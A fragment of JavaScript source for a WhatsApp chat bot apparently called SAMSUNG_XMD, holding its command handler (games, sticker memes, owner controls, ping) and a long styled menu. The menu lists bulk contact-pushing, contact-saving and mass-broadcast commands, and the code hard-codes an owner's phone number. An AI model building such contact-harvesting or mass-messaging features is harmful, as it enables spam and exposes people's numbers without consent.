let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
LordVoltage.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: LordVoltage.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, LordVoltage.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
LordVoltage.ev.emit('messages.upsert', msg)
}
switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': { if (prefix === '.') {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replynano(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await LordVoltage.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await LordVoltage.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replynano('Waiting For Partner\ntype .ttt to join' + (text ? ` Type The Command Below ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }}
            break
            case 'delttc': case 'delttt': {if (prefix === '.') {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            LordVoltage.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            replynano(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            replynano('damaged')
            }
            }}
            break
            
	case 'public': {
  if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
    const response = await setPublicMode(true);
    LordVoltage.sendMessage(m.chat, { text: response, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;

case 'self': {
  if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
    const response = await setPublicMode(false);
    LordVoltage.sendMessage(m.chat, { text: response, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;



case 'smeme': case 'stickermeme': case 'stickmeme': {if (prefix === '.') {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replynano(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await LordVoltage.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await LordVoltage.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replynano(`Send/Reply to Images With Caption ${prefix + command} text1|text2`)
}
}}
break

//case 'jadibot': {if (prefix === '.') {
    // replynano('want to be a bot?')
//}}
//break     
//case 'listjadibot': if (prefix === '.') {
//try {
//let user = [... new Set([...global.conns.filter(LordVoltage => LordVoltage.user).map(LordVoltage => LordVoltage.user)])]
//te = "*Rentbot List*\n\n"
//for (let i of user){
//y = await LordVoltage.decodeJid(i.id)
//te += " × User : @" + y.split("@")[0] + "\n"
//te += " × Name : " + i.name + "\n\n"
//}
//LordVoltage.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
//} catch (err) {
//replynano(`No users have rented bots yet`)
//}}
//break
case 'clearchat': {
  if (prefix === '.') {
    if (!DanzTheCreator) return reply(mess.only.owner)
    await LordVoltage.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
    setTimeout(async () => {
      const doneText = '> \`𝑫𝒐𝒏𝒆\`';
      await LordVoltage.sendMessage(m.chat, { text: doneText, contextInfo: channelContextInfo }, { quoted: fkontak });
    }, 3000); // 3000 milliseconds = 3 seconds
  }
}
break;
case 'pinchat': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
LordVoltage.chatModify({ pin: true }, m.chat)
}}
break
case 'unpinchat': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
LordVoltage.chatModify({ pin: false }, m.chat)
}}
break
case 'restart':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
replynano(`Done Restarting ${global.botname}`)
await sleep(3000)
process.exit()}
break
//case 'totalfeature':
       // case 'totalfitur': 
      //  case 'totalcmd': 
       // case 'totalcommand': if (prefix === '.') {
          //  replynano(`ʜᴇʟʟᴏ ${pushname}
//sᴏ ${botname} ʜᴀs ᴛᴏᴛᴀʟ ғᴇᴀᴛᴜʀᴇs ${nanototalpitur()}
//ʜᴇʟᴘ sᴜᴘᴘᴏʀᴛ ᴀɴᴅ ᴅᴏɴᴀᴛᴇ sᴏ ᴛʜᴀᴛ ᴛʜᴇ ғᴇᴀᴛᴜʀᴇs ᴀʀᴇ ᴀᴠᴀɪʟᴀʙʟᴇ 
//ᴛʜᴇʀᴇ's ᴍᴏʀᴇ... ᴛʜᴀɴᴋ ʏᴏᴜ.`)}
     //   break
     case 'update':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
await LordVoltage.sendMessage(m.chat, { react: { text: "🔌", key: m.key } });
let fine =`Successfully Updated ${global.botname}`;
await LordVoltage.sendMessage(m.chat, {
      text: fine,
    }, { quoted: fkontak });
await sleep(2000)
process.exit()}
break
case 'owner': {
  if (prefix === '.') {
    await LordVoltage.sendMessage(m.chat, { react: { text: "👑", key: m.key } });

    let ownerNumber = "256747122756";
    let ownerLink = `https://wa.me/${ownerNumber.replace("+", "")}`; // Create wa.me link

    let fine = `𝐖𝐚𝐧𝐭 𝐓𝐨 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐲 𝐎𝐰𝐧𝐞𝐫!!!

[ 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒏 ]
𝕎𝕖𝕓𝕤𝕚𝕥𝕖 : ${websitex}
𝕊𝕥𝕒𝕥𝕦𝕤 : *Creator*
𝕀𝕟𝕗𝕠 : *Do Not Spam/Call owners*
`; // Added direct chat link

    await LordVoltage.sendMessage(m.chat, {
      text: fine,
    }, { quoted: fkontak });

    // Delay for 3 seconds (3000 milliseconds) before sending the contact card
    setTimeout(async () => {
      if (owner.length === 0) {
        return replynano("No owner defined."); // Handle case with no owners
      }

      const ownerId = owner[0]; // Assuming only one owner
      const ownerName = " ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧𝘿𝙀𝙑* "; // Define the desired name here

      const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nTEL;type=CELL;waid=${ownerId}:${ownerId}\nX-WA-Me:1\nEND:VCARD`;

      await LordVoltage.sendMessage(m.chat, {
        contacts: {
          displayName: ownerName, // Use the defined name
          contacts: [{ vcard }] // Send a single contact object
        },
        quoted: fkontak // Keep the quoting consistent
      });
    }, 3000); // 3000 milliseconds = 3 seconds
  }
  break;
}

case 'anticall':if (prefix === '.') {
    if (!DanzTheCreator) return reply(mess.only.owner)
    if (args[0] === 'on') {
        db.settings[botNumber].anticall = true;
        replynano(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.settings[botNumber].anticall = false;
        replynano(`${command} is disabled`);
    } else {
        return replynano(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable Anti-Call
            - ${prefix + command} off : Disable Anti-Call

            Example: ${prefix + command} on
        `);
    }}
    break;
case 'hi':if (prefix === '.') {
reply(`*HEY FAM 👋 * ${pushname}\n_𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃 IS HERE TO ASSIST YOU.\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`)}
break
case 'ping': {
  if (prefix === '.') {
    await LordVoltage.sendMessage(m.chat, { react: { text: "🚀", key: m.key } });
    const startTime = performance.now(); // Capture start time

    setTimeout(async () => {
      const endTime = performance.now(); // Capture end time after the delay
      const responseTime = Math.floor(endTime - startTime); // Calculate response time

      let chan = `
╭ *𓊈 𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃 𓊉*
┃ *𝐒𝐀𝐌𝐒𝐔𝐍𝐆 PING :*
┃ *_${latensi.toFixed(4)} 𝐒_*
╰ *𓊈 WE LURK IN THE 𝐒𝐀𝐌𝐒𝐔𝐍𝐆𓊉*
> BEHOLD THE TOUCH OF 𝐒𝐀𝐌𝐒𝐔𝐍𝐆 
`;

      await LordVoltage.sendMessage(m.chat, {
        text: chan,
        contextInfo: {
          forwardingScore: 0,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363400964601488@newsletter',
            newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]'
          },
        }
      }, { quoted: fkontak }); // Using 'm' for quoting the triggering message
    }, 500); // Delay of 500 milliseconds (0.5 seconds)
  }
  break;
}

case "areact": {if (prefix === '.') {
    if (!DanzTheCreator) return reply('ᴏɴʟʏ ᴏᴡɴᴇʀ');

    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply(' 𝚄𝚂𝙴: *areact on* 𝙾𝚁 *areact off*');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('🟢 ᴀᴜᴛᴏ ʀᴇᴀᴄᴛ ʜᴀs ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('🔴 ᴀᴜᴛᴏʀᴇᴀᴄᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴀʙʟᴇᴅ');
    }
}}
break;                                     
case `menu`: {
if (prefix === '.') {
await LordVoltage.sendMessage(m.chat, { react: { text: "🎭",key: m.key,}})
const uptime = getUptime();
let menya =`
*♧𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ ♧𝘿𝙀𝙑♧
╭ ★ 𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃 ★
┃📌 𝗣𝗥𝗘𝗙𝗜𝗫: .
┃📌 𝗠𝗢𝗗𝗘: ${getPublicModeStatus() ? 'public' : 'self'}
┃📌 𝗩𝗘𝗥𝗦𝗜𝗢𝗡: 1.0
┃📌 𝗗𝗔𝗧𝗘: ${xdate}
┃📌 𝗨𝗦𝗘𝗥: ${pushname}
┃📌 𝗥𝗨𝗡𝗧𝗜𝗠𝗘: ${uptime}
╰ ★

‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
╭ ★ 🤖 AI 𝗠𝗘𝗡𝗨 🤖 ★
┃💫.𝗦𝗣𝗔𝗥𝗞𝗔𝗜 <𝗤𝗨𝗘𝗥𝗬>
┃💫.𝗔𝗨𝗧𝗢𝗔𝗜𝗚𝗖 𝗢𝗡/𝗢𝗙𝗙
┃💫.𝗚𝗘𝗠𝗜𝗡𝗜 <𝗤𝗨𝗘𝗥𝗬>
┃💫.𝗔𝗜 <𝗤𝗨𝗘𝗥𝗬>
┃💫.𝗥𝗘𝗔𝗟𝗜𝗦𝗧𝗜𝗖 <𝗤𝗨𝗘𝗥𝗬>
┃💫.𝗚𝗣𝗧 <𝗤𝗨𝗘𝗥𝗬>
┃💫.𝗛𝗘𝗟𝗣
┃
╰★

╭ ★ 👑 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 👑 ★
┃
┃💫.𝗢𝗡𝗟𝗬𝗣𝗖
┃💫.𝗢𝗡𝗟𝗬𝗚𝗖
┃💫.𝗦𝗘𝗟𝗙
┃💫.𝗣𝗨𝗕𝗟𝗜𝗖
┃💫.𝗖𝗟𝗘𝗔𝗥𝗖𝗛𝗔𝗧
┃💫.𝗔𝗭𝗔
┃💫𝗦𝗘𝗡𝗗 <𝗥𝗘𝗣𝗟𝗬 𝗦𝗧𝗔𝗧𝗨𝗦>
┃💫.𝗝𝗢𝗜𝗡
┃💫.𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧
┃💫.𝗔𝗨𝗧𝗢𝗧𝗬𝗣𝗜𝗡𝗚
┃💫.𝗔𝗨𝗧𝗢𝗥𝗘𝗖𝗢𝗥𝗗𝗜𝗡𝗚
┃💫.𝗔𝗨𝗧𝗢𝗕𝗟𝗢𝗖𝗞𝗠𝗔
┃💫.𝗔𝗨𝗧𝗢𝗩𝗜𝗘𝗪𝗦𝗧𝗔𝗧𝗨𝗦
┃💫.𝗔𝗡𝗧𝗜𝗖𝗔𝗟𝗟
┃💫.𝗔𝗨𝗧𝗢𝗥𝗘𝗔𝗖𝗧
┃💫.𝗣𝗢𝗟𝗟
┃💫.𝗕𝗖𝗜𝗠𝗔𝗚𝗘
┃💫.𝗕𝗖𝗩𝗜𝗗𝗘𝗢
┃💫.𝗖𝗥𝗘𝗔𝗧𝗘𝗚𝗖
┃💫.𝗦𝗘𝗧𝗣𝗔𝗖𝗞𝗡𝗔𝗠𝗘
┃💫.𝗨𝗦𝗘𝗥𝗝𝗜𝗗
┃💫.𝗦𝗘𝗧𝗕𝗢𝗧𝗡𝗔𝗠𝗘
┃💫.𝗦𝗘𝗧𝗕𝗜𝗢
┃💫.𝗗𝗘𝗟𝗣𝗣𝗕𝗢𝗧
┃💫.𝗥𝗘𝗦𝗧𝗔𝗥𝗧
┃💫.𝗦𝗘𝗧𝗣𝗣
┃💫.𝗔𝗗𝗗𝗣𝗥𝗘𝗠
┃💫.𝗗𝗘𝗟𝗣𝗥𝗘𝗠
┃💫.𝗔𝗗𝗗𝗢𝗪𝗡𝗘𝗥
┃💫.𝗔𝗗𝗗𝗢𝗪𝗡𝗘𝗥
┃💫.𝗕𝗟𝗢𝗖𝗞 <234**>*
┃💫.𝗨𝗡𝗕𝗟𝗢𝗖𝗞 <234**>*
┃💫.𝗨𝗣𝗗𝗔𝗧𝗘
┃💫.𝗟𝗘𝗙𝗧
┃💫.𝗣𝗨𝗦𝗛𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗦𝗔𝗩𝗘𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗦𝗔𝗩𝗘𝗖𝗢𝗡𝗧𝗔𝗖𝗧2
┃💫.𝗚𝗘𝗧𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗦𝗘𝗡𝗗𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗝𝗣𝗠
┃💫.𝗝𝗣𝗠2
┃
╰★

╭ ★ 🌐 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡U 🌐 ★
┃
┃💫.𝗦𝗘𝗧𝗪𝗘𝗟𝗖𝗢𝗠𝗘
┃💫.𝗦𝗘𝗧𝗟𝗘𝗙𝗧
┃💫.𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗢𝗡/𝗢𝗙𝗙
┃💫.𝗔𝗡𝗧𝗜𝗟𝗜𝗡𝗞
┃💫.𝗟𝗜𝗡𝗞𝗚𝗖
┃💫.𝗜𝗡𝗩𝗜𝗧𝗘
┃💫.𝗔𝗨𝗧𝗢𝗞𝗜𝗖𝗞𝗠𝗔
┃💫.𝗟𝗘𝗔𝗩𝗘
┃💫.𝗗𝗜𝗦𝗔𝗣𝗣𝗘𝗔𝗥
┃💫.𝗗𝗘𝗟
┃💫.𝗖𝗟𝗢𝗦𝗘𝗧𝗜𝗠𝗘
┃💫.𝗢𝗣𝗘𝗡𝗧𝗜𝗠𝗘
┃💫.𝗔𝗗𝗗𝗟𝗜𝗦𝗧
┃💫.𝗗𝗘𝗟𝗟𝗜𝗦𝗧
┃💫.𝗨𝗣𝗗𝗔𝗧𝗘𝗟𝗜𝗦𝗧
┃💫.𝗟𝗜𝗦𝗧
┃💫.𝗦𝗘𝗧𝗚𝗖𝗣𝗣
┃💫.𝗗𝗘𝗟𝗚𝗖𝗣𝗣
┃💫.𝗦𝗘𝗧𝗡𝗔𝗠𝗘
┃💫.𝗦𝗘𝗧𝗗𝗘𝗦𝗖
┃💫.𝗔𝗗𝗗
┃💫.𝗞𝗜𝗖𝗞
┃💫.𝗟𝗢𝗟
┃💫.𝗟𝗢𝗟𝗭
┃💫.𝗣𝗥𝗢𝗠𝗢𝗧𝗘
┃💫.𝗗𝗘𝗠𝗢𝗧𝗘
┃💫.𝗛𝗜𝗗𝗘𝗧𝗔𝗚
┃💫.𝗧𝗔𝗚
┃💫.𝗧𝗔𝗚𝗔𝗟𝗟
┃💫.𝗥𝗘𝗦𝗘𝗧𝗟𝗜𝗡𝗞
┃💫.𝗚𝗘𝗧𝗕𝗜𝗢
┃💫.𝗩𝗢𝗧𝗘
┃💫.𝗨𝗣𝗩𝗢𝗧𝗘
┃💫.𝗗𝗢𝗪𝗡𝗩𝗢𝗧𝗘
┃💫.𝗖𝗛𝗘𝗖𝗞𝗩𝗢𝗧𝗘
┃💫.𝗗𝗘𝗟𝗩𝗢𝗧𝗘
┃💫.𝗔𝗨𝗧𝗢𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗚𝗖
┃💫.𝗡𝗦𝗙𝗪
┃
╰★

╭ ★ 📍 𝗣𝗨𝗦𝗛 𝗠𝗘𝗡𝗨 📍 ★
┃
┃💫.𝗖𝗘𝗞𝗜𝗗𝗚𝗖
┃💫.𝗣𝗨𝗦𝗛𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗩𝗖𝗙
┃💫.𝗦𝗔𝗩𝗘𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗚𝗘𝗧𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗦𝗘𝗡𝗗𝗖𝗢𝗡𝗧𝗔𝗖𝗧
┃💫.𝗝𝗣𝗠
┃💫.𝗝𝗣𝗠2
┃
╰★

╭ ★ 📥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨 📥b★
┃💫.𝗘𝗡𝗖𝗥𝗬𝗣𝗧
┃💫.𝗧𝗧
┃💫.𝗬𝗧𝗦𝗘𝗔𝗥𝗖𝗛
┃💫.𝗣𝗟𝗔𝗬
┃💫.𝗬𝗧𝗠𝗣𝟯
┃💫.𝗬𝗧𝗠𝗣𝟰
┃💫.𝗜𝗠𝗗𝗕
